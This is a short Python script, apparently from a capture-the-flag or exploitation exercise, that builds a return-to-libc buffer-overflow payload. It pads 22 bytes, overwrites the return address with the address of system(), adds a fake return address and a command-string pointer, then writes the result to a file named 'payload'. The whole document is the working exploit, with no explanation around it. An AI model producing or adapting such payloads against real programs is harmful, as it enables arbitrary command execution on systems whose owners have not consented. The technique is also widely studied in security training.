import struct

padding = "A" * 22
eip = struct.pack("I", 0x08048422)
ebp = "BBBB"
fakeret = "CCCC"
system = struct.pack("I", 0xf7e3cd80)
cmd = struct.pack("I", 0x8048580)
read = struct.pack("I", 0xf7ed7c00)
write = struct.pack("I", 0xf7ed7c70)

exploit = padding + system + fakeret + cmd 

print exploit

file = open("payload", "wb")
file.write(exploit)
file.close()
